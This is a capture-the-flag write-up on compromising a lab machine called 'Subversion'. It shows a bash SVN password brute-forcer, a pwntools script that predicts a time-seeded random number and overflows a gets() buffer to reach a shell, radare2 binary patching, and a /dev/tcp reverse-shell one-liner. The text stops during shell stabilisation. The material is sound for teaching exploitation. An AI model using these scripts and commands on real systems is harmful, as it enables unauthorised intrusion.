![Screenshot](/hard/Subversion/Images/machine.png)

Difficulty: **Hard**

Made by: **Lenam**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🔍 [Enumeration](#enumeration)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

## 🛠️  Techniques: Enumeration with gobuster, Create our exploit for SVN, extract repo of svn, analyze binary, develop a exploit to lead a BoF and gain access, transfer files with cat, escalate privileges with tar and GTFObins.

---

First of all we make sure the machine is up, we can check it quickly with the command **ping**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.247 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.085 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.135 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2031ms
rtt min/avg/max/mdev = 0.085/0.155/0.247/0.067 ms
```

Now, we can start our reconnaissance phase.

---
# Reconnaissance

We start this phase always with **nmap**, to know what ports are open in the target machine.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-02 21:41 -0500
Initiating ARP Ping Scan at 21:41
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 21:41, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:41
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 1789/tcp on 172.17.0.2
Discovered open port 3690/tcp on 172.17.0.2
Completed SYN Stealth Scan at 21:41, 2.77s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000023s latency).
Scanned at 2026-02-02 21:41:12 -05 for 3s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 64
1789/tcp open  hello   syn-ack ttl 64
3690/tcp open  svn     syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.16 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

After the scan concludes we can see 3 ports open:

- port 80 (http / Hyper-Text Transfer Protocol )
- port 1789 (????)
- port 3690 (svn)

But we need to make another scan with nmap, to know more about these ports like what services and versions are running on, and find possible vulnerabilities by old versions.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ nmap -n -p80,1789,3690 -sCV 172.17.0.2 -oX target --stats-every=1m
```

**-p80,1789,3690** <- With this argument nmap will only scan these 3 ports that we discover before.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target** <- With this argument we save all the output that nmap give us and save it as a xml file.

**--stats-every=1m** <- With this argument we receive stats of the scan every 1 minute, this can have minutes (m) and seconds (s)

After the scan finish we got the output in a xml file, we do this to make a html page to see the information more easily and pretty to look at.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumerationn]
└─$ xsltproc target -o target.html
```

With this command we convert the xml file to a html file, now let's open it.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ open target.html 
```

And we can see this in our browser.

![Screenshot](/hard/Subversion/Images/image1.png)

And we can see the information way more pretty and readable.

We can see that the port 80 it seems a website.

Also we can see that the port 3690 is a Svn server, this means that is like a "shared" repository that we can download if we get the username and a password.

And lastly the port 1789 we can see this if we connect with **netcat**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ nc 172.17.0.2 1789
Bienvenido a subversion!
Pregunta 1: ¿En qué año ocurrió la Revolución Francesa?
Respuesta: test
Respuesta incorrecta. No puedes continuar.
```

We can see this, but don't too fast, let's begin with the website.

I begin with the website with **whatweb** to find what technologies this service.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[172.17.0.2], Title[Subversión], nginx[1.18.0]
```

We can see that is using **Nginx** this can be useful to know.

Okay now let's take a look with our browser.

![Screenshot](/hard/Subversion/Images/image2.png)

And we can see this, nothing interesting here, not even in the source code or in the image.

---
# Enumeration

We can use **gobuster** to find more resources, directories, or even files with this tool.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 999]
upload               (Status: 200) [Size: 163]
```

**-x** <- This parameter we can add extensions that we can try to find, in this case im using php, html and txt files.

And we find upload in the website.

```python
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/enumeration]
└─$ curl -s http://172.17.0.2/upload
¡Por aquí no es! ¿No viste al conejo? Iba con un mosquete y una boina revolucionaria... 
Pero con svnuser quizá puedas hacer algo en el repositorio subversion.
```

It seems a hint and information of the repository and the user **svnuser**.

We can try to connect with the command **svn** in our system.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ svn ls svn://172.17.0.2/subversion
Authentication realm: <svn://172.17.0.2:3690> a073d24b-9572-4dee-bc6c-1dd0b855a29c
Password for 'craft': *****

Authentication realm: <svn://172.17.0.2:3690> a073d24b-9572-4dee-bc6c-1dd0b855a29c
Username: admin
Password for 'admin': *****

Authentication realm: <svn://172.17.0.2:3690> a073d24b-9572-4dee-bc6c-1dd0b855a29c
Username: admin
Password for 'admin': ******** 

svn: E170013: Unable to connect to a repository at URL 'svn://172.17.0.2/subversion'
svn: E170001: Authentication error from server: Username not found
```

We can see that we need a valid username and password, for luck of us, we got already a possible user **svnuser**.

---
# Exploitation

But we need to get the password of this user, we can use the next command to pass the username and the password directly:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ svn ls --username svnuser --password admin123 svn://172.17.0.2/subversion --non-interactive
svn: E170013: Unable to connect to a repository at URL 'svn://172.17.0.2/subversion'
svn: E170001: Authentication error from server: Password incorrect
```

We can use this to make a script of bash that are going to try a lot of passwords, and we can use the status code of the command with **$?**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ svn ls --username svnuser --password admin123 svn://172.17.0.2/subversion --non-interactive
svn: E170013: Unable to connect to a repository at URL 'svn://172.17.0.2/subversion'
svn: E170001: Authentication error from server: Password incorrect
                                                                                
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ echo $?
1
```

We can see that the status code of the previous command that was executed, is 1, this number or any different of 0 is an error, so if the command is equal to 0 is successful in other words we can try to find the password with the status code.

And this is the script of bash:

```bash
#!/bin/bash

green='\033[0;32m'
red='\033[0;31m'
cyan='\033[0;36m'
orange='\e[38;5;214m'
reset='\e[0m'

dictionary='/usr/share/wordlists/rockyou.txt'

ctrl_c () {
  echo -e "\n\n${red}[!] QUITTING...${reset}"
  exit 1
}

trap ctrl_c INT

while IFS= read -r pass; do
  echo -en "${orange}[*] Trying with: $pass             ${reset}\r"
  svn ls --username svnuser --password $pass svn://172.17.0.2/subversion --non-interactive \
    &>/dev/null

  if [ $? == 0 ]; then
    cmd="svn co --username svnuser --password $pass svn://172.17.0.2/subversion"
    echo -e "${green}[i] PWNED, the password is: $pass ${reset}"
    echo $cmd | xclip -sel clip
    echo -e "${cyan}[~] Command copied to the clipboard.${reset}"
    exit 0
  fi
done < $dictionary
```

Here we are going to introduce every possible password from the file **rockyou.txt** into the command, and if is successful we got the password and also the command to download all the repository copied to the clipboard.

Now let's give them permissions of execution with **chmod**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ chmod +x bruteforcer.sh
```

Okay now, let's execute the exploit.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ ./bruteforcer.sh 
[i] PWNED, the password is: iloveyou!    
[~] Command copied to the clipboard.
```

And after some seconds, we got the password of the repo!

Now let's download all of his contents.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ svn co --username svnuser --password iloveyou! svn://172.17.0.2/subversion

A    subversion/subversion
A    subversion/subversion.c
Checked out revision 1.
```

And we got the directory of the repo and all of his contents inside of it.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ tree -a
.
└── subversion
    ├── subversion
    ├── subversion.c
    └── .svn
        ├── entries
        ├── format
        ├── pristine
        │   ├── 12
        │   │   └── 1242075dc6a8b2fda4658c141d0de7842b5793a2.svn-base
        │   └── 13
        │       └── 13db0bdacb79d74993c2f7d8cf0f683e3e29a698.svn-base
        ├── tmp
        ├── wc.db
        └── wc.db-journal

7 directories, 8 files
```

We can see the executable and also the source code of the binary.

Let's use the command file to know more about this binary.

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ file subversion
subversion: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ed4c16c23b552a78bfdab6f2cb45655984b77ee9, for GNU/Linux 3.2.0, not stripped
```

We can see that is a executable of 64 bits and is **not stripped**, this means that we can see the name of the functions, name of the variables that is being used in the binary.

If we execute the binary we can see this:

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ ./subversion 
Bienvenido a subversion!
Pregunta 1: ¿En qué año ocurrió la Revolución Francesa?
Respuesta: 1789
Pregunta 2: ¿Cuál fue el nombre del movimiento liderado por Mahatma Gandhi en la India?
Respuesta: 
Respuesta incorrecta. No puedes continuar.
```

It looks exactly the same as the running one into the target machine into the port 1789.

We can see what protections are enabled into this binary with **checksec**.

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ checksec --file=subversion 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   80 Symbols        No    0               3               subversion
```

We can even inject shellcodes here! all is disabled.

And the important things of this code is the following parts:

```c
void ask_questions() {
    char answer[256];
    int random_number;
    char number_str[5];

    // Semilla para el generador de números aleatorios basada en un XOR del tiempo y el numero 69
    srand(time(NULL) ^ 69);

    // Generar un número aleatorio entre 0 y 9999999
    random_number = rand() % 10000000;
```

It seems that generate a **"random"** number, and the seed is the actual time of the system, and with that seed generates a number between 0  and 9,999,999.

This is important to know and we can predict those numbers with python.

In computing it doesn't exist a real **"random"** number, it looks like it is, but it doesn't and that numbers are called as **pseudo-random** numbers, it follows a pattern and if we know the formula we can predict the same sequence of numbers for example, im going to make a "random" number with python and enter the same seed using the libraries of C:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ python3 predictor.py 

[i] Choose a number (seed) --> 96
[!] The generated number is: 39201

[i] Choose a number (seed) --> 96
[!] The generated number is: 39201

[i] Choose a number (seed) --> 32445
[!] The generated number is: 68589
```

here we can see if that we enter the same number or seed, it generates a **"random"** number, but isn't it, looks like a random number but if we enter the same seed generates the same number.

It acts like a pseudo-random generator of numbers and depend of the seed, that's why we can see the same sequence if we enter a same seed.

And the code that we see before it makes a seed taking the actual time of the system, if we can execute the binary and take exactly the time of the system, this is very easy with python and using **pwntools**.

Okay and the next 2 parts are also important:

```c
   int user_guess = atoi(answer);

    if (user_guess != random_number) {
        printf("Respuesta incorrecta. No puedes continuar.\n");
        return;
    }

    printf("¡Felicitaciones! Has adivinado el número secreto.\n");
    magic_text();
}

void magic_text() {
    char buffer[64];
    printf("Introduce tu \"mágico\" texto para continuar: ");
    gets(buffer); 
    printf("Has introducido: %s\n", buffer);
}
```

If we don't enter the correct number the binary kick us.

But if we enter the correct number, then are going to call a function **magic_text** and introduce an text into it.

We can see that is using the function **gets** and this can lead into a Buffer Overflow.

And also in all the code of C we got all the answers of this binary.

Lastly a curious function shell on the code.

```c
void shell() {
    system("/bin/bash");
}
```

So we can make use of this function when we cause the BoF.

So im going to make a python script that generates the random number and enter all the answers with a process using **pwntools**.

```python
from pwn import *
import ctypes, time

def exploit():
    prc = process("../files/subversion/subversion")
    libc = ctypes.CDLL("libc.so.6")

    seed = int(time.time()) ^ 69
    libc.srand(seed)

    random_num = str(libc.rand() % 10000000).encode()

    prc.sendlineafter(b"Respuesta: ", b"1789")
    prc.sendlineafter(b"Respuesta: ", b"noviolencia")
    prc.sendlineafter(b"Respuesta: ", b"caidadelmuro")
    prc.sendlineafter(b"Respuesta: ", b"cartamagna")
    prc.sendlineafter(b"Respuesta: ", b"luchacontraelapartheid")
    prc.sendlineafter(b"Respuesta: ", random_num)

    output = prc.recvall(timeout=1).decode()
    print(output)

if __name__ == "__main__":
    exploit()
```

And when we execute it we can see this:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ python3 exploit.py 
[+] Starting local process '../files/subversion/subversion': pid 4890
[+] Receiving all data: Done (97B)
[*] Stopped process '../files/subversion/subversion' (pid 4890)
¡Felicitaciones! Has adivinado el número secreto.
Introduce tu "mágico" texto para continuar:
```

We can finally enter this function and cause a BoF, we already know the size of the buffer in this function that is 64 bytes.

To overwrite RIP (Instruction Pointer) and lead the flow of the program anywhere that we want to, in 64 bits, the registers have spaces of 8 bytes, the 1st register that is after of this buffer is **RBP** (Frame pointer / Stack Base pointer) and after this register comes RIP (Instruction Pointer) and this is that we want to overwrite because if we can do it, we can lead the program to any part of the code, if you remember PIE is disabled, so all the internal addresses of this binary will be static even if ASLR (Address Space Layout Randomization) is enabled (2).

So to overwrite RIP we need a total of 72 bytes before overwriting in it.

If you remember we already have a function that is **shell**.

We can use **objdump** to find the address of this function and his instructions.

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ objdump subversion -d -M intel 
.........
00000000004017ac <shell>:
  4017ac:       f3 0f 1e fa             endbr64
  4017b0:       55                      push   rbp
  4017b1:       48 89 e5                mov    rbp,rsp
  4017b4:       48 8d 3d a0 0b 00 00    lea    rdi,[rip+0xba0]        # 40235b <_IO_stdin_used+0x35b>
  4017bb:       e8 40 f9 ff ff          call   401100 <system@plt>
  4017c0:       90                      nop
  4017c1:       5d                      pop    rbp
  4017c2:       c3                      ret
  4017c3:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
  4017ca:       00 00 00 
  4017cd:       0f 1f 00                nop    DWORD PTR [rax]
.........
```

So we can jump into the address of the instruction `lea    rdi,[rip+0xba0]` that is **0x4017b4** that is the address of that instruction, and that were is belong the string **/bin/bash** that is being saved into **RDI**, and then execute system and gain a shell.

Now let's change once again the exploit to jump directly into this instruction.

```python
from pwn import *
import ctypes, time

def exploit():
    prc = process("../files/subversion/subversion")
    libc = ctypes.CDLL("libc.so.6")

    seed = int(time.time()) ^ 69
    libc.srand(seed)

    random_num = str(libc.rand() % 10000000).encode()

    prc.sendlineafter(b"Respuesta: ", b"1789")
    prc.sendlineafter(b"Respuesta: ", b"noviolencia")
    prc.sendlineafter(b"Respuesta: ", b"caidadelmuro")
    prc.sendlineafter(b"Respuesta: ", b"cartamagna")
    prc.sendlineafter(b"Respuesta: ", b"luchacontraelapartheid")
    prc.sendlineafter(b"Respuesta: ", random_num)

    shell = p64(0x4017b4)
    offset = 72

    payload = b"A"*offset + shell

    prc.sendlineafter(b"continuar: ", payload)
    prc.interactive()

if __name__ == "__main__":
    exploit()
```

Okay so let's execute the exploit and see if it works...

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ python3 exploit.py 
[+] Starting local process '../files/subversion/subversion': pid 6525
[*] Switching to interactive mode
Has introducido: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb4\x17@
$ whoami
craft
$ id
uid=1000(craft) gid=1000(craft) groups=1000(craft),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),135(kaboxer)
```

And we can finally execute commands!

So to exploit this binary to the target machine we need to change few lines.

```python
from pwn import *
import ctypes, time

target = "172.17.0.2"
port = 1789

def exploit():
    prc = remote(target, port)
    libc = ctypes.CDLL("libc.so.6")

    seed = int(time.time()) ^ 69
    libc.srand(seed)

    random_num = str(libc.rand() % 10000000).encode()

    prc.sendlineafter(b"Respuesta: ", b"1789")
    prc.sendlineafter(b"Respuesta: ", b"noviolencia")
    prc.sendlineafter(b"Respuesta: ", b"caidadelmuro")
    prc.sendlineafter(b"Respuesta: ", b"cartamagna")
    prc.sendlineafter(b"Respuesta: ", b"luchacontraelapartheid")
    prc.sendlineafter(b"Respuesta: ", random_num)

    shell = p64(0x4017b4)
    offset = 72

    payload = b"A"*offset + shell

    prc.sendlineafter(b"continuar: ", payload)
    prc.interactive()

if __name__ == "__main__":
    exploit()
```

Okay now let's execute the exploit then!

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ python3 exploit.py
[+] Opening connection to 172.17.0.2 on port 1789: Done
[*] Switching to interactive mode
Has introducido: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb4\x17@
bash: /root/.bashrc: Permission denied
luigi@20ea2b07912f:/$ $ whoami
luigi
luigi@20ea2b07912f:/$ $ id
uid=1000(luigi) gid=0(root) groups=0(root)
luigi@20ea2b07912f:/$ $
```

And we gain access as the user **luigi** in the system!

### Extra step (optional)

If we don't get the official source code of the binary, we can use **GDB**, and also **radare2** these two amazing reversing tools are going to be very useful, to find the buffer of the vulnerable part (magic_text).

How we can do it?

In the part of pure questions isn't vulnerable, the vulnerable part is the **magic_text** function.

And how we can get there with **GDB**?

Is very hard, because we need to guess the random number before jumping to the vulnerable function, remember that we need to guess a random number between 0 and 9,999,999 and is very unlikely to guess the right number.

But still we have a way to skip this restriction.

Imagine this, the part that fuck us, is this:

```c
if (user_guess != random_number) {
	printf("Respuesta incorrecta. No puedes continuar.\n");
	return;
}
```

Here if we enter **any** different number from the random number, the program are going to jump to this conditional.

But if we change this?

```c
if (user_guess == random_number) {
	printf("Respuesta incorrecta. No puedes continuar.\n");
	return;
}
```

Can you see the difference?

We are changing the operator to **== (equal)** instead of **!= (not equal)**.

So if we enter any incorrect number we skip this restriction.

And how can we do it?

We can do this with **radare2** also with **IDA**, im using radare to change more quickly this binary.

And with this we need to understand **assembly** code, because assembly and C are so different, I put the example of before to understand that we are going to do now.

So when we are modifying a binary is a good practice to make a copy/backup of that binary, because sometimes we can make an error in the binary, and we still have a recover of that file.

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ cp subversion subversion.bkp
```

Here Im making a copy of the binary subversion with the extension  **.bkp** this isn't important to know, im using that extension to know who is the copy.

Now we need to use **radare2** and also modify instructions of the binary.

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ r2 -A -w subversion
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x004011b0]>
```

With the argument **-w** we are telling to radare that we are going to make some changes, because if we don't we can't make changes into the binary, but still we can enable it with the command **oo+**

And the command **-A** basically analizes all the symbols, entries, function calls, etc such as the command **aaa (analyze all automatically)**.

To show all the function we can enter the command **afl (listen all functions)**

```r
[0x004011b0]> afl
0x004010f0    1     11 sym.imp.puts
0x00401100    1     11 sym.imp.system
0x00401110    1     11 sym.imp.printf
0x00401120    1     11 sym.imp.srand
0x00401130    1     11 sym.imp.fgets
0x00401140    1     11 sym.imp.strcmp
0x00401150    1     11 sym.imp.time
0x00401160    1     11 sym.imp.gets
0x00401170    1     11 sym.imp.setvbuf
0x00401180    1     11 sym.imp.atoi
0x00401190    1     11 sym.imp.rand
0x004011a0    1     11 sym.imp.__ctype_b_loc
0x004011b0    1     46 entry0
0x004011f0    4     31 sym.deregister_tm_clones
0x00401220    4     49 sym.register_tm_clones
0x00401260    3     32 entry.fini0
0x00401290    1      6 entry.init0
0x00401840    1      5 sym.__libc_csu_fini
0x00401848    1     13 sym._fini
0x004012d9   17    864 sym.ask_questions
0x00401639    1     73 sym.magic_text
0x00401682   30    298 sym.normalize_input
0x004017d0    4    101 sym.__libc_csu_init
0x004011e0    1      5 sym._dl_relocate_static_pie
0x00401296    1     67 main
0x004017ac    1     23 sym.shell
0x00401000    3     27 sym._init
```

And we can see a lot of functions, even the shell function that we see before.

The one that we need to see is **sym.ask_questions**, and to see all his disassembled code we can use **pdf@sym.ask_questions (print disassembled function)**

![Screenshot](/hard/Subversion/Images/image3.png)

We can see that the 1st part is making all the necessary steps to make the comparative of the user input with the random generated number, more specifically the instruction:

- **cmp eax, dword [var_4h]**

This instruction compares eax with a value that is on the stack, very probably that is the generated number.

So in resume eax -> input user
var_4h -> random number (in the stack)

what it does **cmp**?

Basically just subtracts the 2 operators: eax - [var_4h]

Or for example: 45,368 - 8,522,426

And by the time that does this instruction activate some eflags in the CPU depending of the result.

if the result is 0 the ZF (zero flag) is activated.

And there is a little bit more of eflags like: jne, jnz, jl, jg, etc....

And why is activated these flags, because the next instruction make use of these flags.

In this case is the 2nd part:

- **je 0x401621**

This instruction does this; checks if the eflag ZF is activated, this means if the result is equal to 0 then jumps to the address 0x401621

in resume all that instructions basically do this:

```python
if user_input == random_number: JUMP to 0x401621
```

And how can we change that instruction?

With **radare2** we can write the instruction and change that opcode to JNE (Jump If Not Equal) instead of JE (Jump If Equal)

In the 3rd part of the image the arrow is showing us where is located that instruction (0x00401611)

So we need to change where is located radare2

```r
[0x004011b0]> s 0x00401611
[0x00401611]>
```

we S(witch) the position to the address of that instruction.

And the we are going to use the following command:

```r
[0x00401611]> wa jne 0x401621
INFO: Written 2 byte(s) (jne 0x401621) = wx 750e @ 0x00401611
```

We w(rite) a(ssembly) in that address that instruction JNE and his address to jump.

Now if we exit from radare2 and execute the binary we can see this:

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ ./subversion
Bienvenido a subversion!
Pregunta 1: ¿En qué año ocurrió la Revolución Francesa?
Respuesta: 1789
Pregunta 2: ¿Cuál fue el nombre del movimiento liderado por Mahatma Gandhi en la India?
Respuesta: noviolencia
Pregunta 3: ¿Qué evento histórico tuvo lugar en Berlín en 1989?
Respuesta: caidadelmuro
Pregunta 4: ¿Cómo se llama el documento firmado en 1215 que limitó los poderes del rey de Inglaterra?
Respuesta: cartamagna
Pregunta 5: ¿Cuál fue el levantamiento liderado por Nelson Mandela contra el apartheid?
Respuesta: luchacontraelapartheid
Pregunta extra: Adivina el número secreto para continuar (entre 0 y 9999999):
Respuesta: 02432
¡Felicitaciones! Has adivinado el número secreto.
Introduce tu "mágico" texto para continuar: testing
Has introducido: testing
```

We can see that we absolutely bypass this restriction with that instruction that we wrote before.

Now we can use GDB to know what is the offset of RIP before overwriting this register.

```r
┌──(craft㉿kali)-[~/…/dificil/subversion/files/subversion]
└─$ gdb -q subversion
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 17.1 in 0.01ms using Python engine 3.13
Reading symbols from subversion...
(No debugging symbols found in subversion)
gef➤
```

To find directly the offset of RIP, we need to create a pettern, we can do this with gef directly.

```r
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaa ......
[+] Saved as '$_gef0'
```

Now we copy this payload to our clipboard.

And run the program and enter all the answers.

```d
gef➤  r
Starting program: /home/craft/challenges/dockerlabs/dificil/subversion/files/subversion/subversion 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Bienvenido a subversion!
Pregunta 1: ¿En qué año ocurrió la Revolución Francesa?
Respuesta: 1789
Pregunta 2: ¿Cuál fue el nombre del movimiento liderado por Mahatma Gandhi en la India?
Respuesta: noviolencia
Pregunta 3: ¿Qué evento histórico tuvo lugar en Berlín en 1989?
Respuesta: caidadelmuro
Pregunta 4: ¿Cómo se llama el documento firmado en 1215 que limitó los poderes del rey de Inglaterra?
Respuesta: cartamagna
Pregunta 5: ¿Cuál fue el levantamiento liderado por Nelson Mandela contra el apartheid?
Respuesta: luchacontraelapartheid
Pregunta extra: Adivina el número secreto para continuar (entre 0 y 9999999):
Respuesta: 79823
¡Felicitaciones! Has adivinado el número secreto.
Introduce tu "mágico" texto para continuar:
```

Okay right next to "continuar:" we need to enter our copied payload into there.

And we can see this:

![Screenshot](/hard/Subversion/Images/image4.png)

We overwrite the register of RBP (base stack pointer),  this register is just before RIP (Instruction Pointer)

To find the offset of RIP we need to use the following command:

```r
gef➤  pattern offset $rsp
[+] Searching for '6a61616161616161'/'616161616161616a' with period=8
[+] Found at offset 72 (little-endian search) likely
```

Why RSP (Stack Pointer)?

Because both registers (RSP / RIP) are related with data that we overwrite in the stack.

This is another way to calculate the offset of RIP, all the process that we did before will work always.

Im going to make a diagram with excalidraw to explain all the exploit.

![Screenshot](/hard/Subversion/Images/image5.png)

Now let's jump into privilege escalation.

---
# Privilege Escalation

We are like this:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ python3 exploit.py 
[+] Opening connection to 172.17.0.2 on port 1789: Done
[*] Switching to interactive mode
Has introducido: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb4\x17@
bash: /root/.bashrc: Permission denied
luigi@9a120396fb0d:/$ $ whoami
luigi
luigi@9a120396fb0d:/$ $ id
uid=1000(luigi) gid=0(root) groups=0(root)
luigi@9a120396fb0d:/$ $
```

We are using the terminal of **Pwntools**, personally I don't like it, so im going to make a reverse shell, and receive the shell with **netcat**.

So we are going to make another terminal with **netcat** in listen mode.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

**-l**  <- This argument makes to netcat to be in listening mode.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes to netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

Okay now let's execute the following command into the terminal of pwntools.

- **bash -i >& /dev/tcp/172.17.0.1/1234 0>&1**

With this command we are basically executing a shell interactive of bash and redirect it to us, in the port 1234.

```r
luigi@9a120396fb0d:/$ $ bash -i >& /dev/tcp/172.17.0.1/1234 0>&1
```

And we receive this in our netcat terminal.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 57630
bash: /root/.bashrc: Permission denied
luigi@9a120396fb0d:/$
```

Okay now let's modify this shell to work better with it.

We are going to cut the pwntools terminal, because this process is very uncomfortable and we don't want to use it.

So let's execute the following command in our reverse shell.

```r
luigi@9a120396fb0d:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
bash: /root/.bashrc: Permission denied
luigi@9a120396fb0d:/$
```

Okay we can cut the **pwntools** shell with CTRL + C.

And we can see this:

```r
luigi@9a120396fb0d:/$ bash: [119: 3 (255)] tcsetattr: Input/output error
Hangup
```

Don't worry let's execute again the command script.

```r
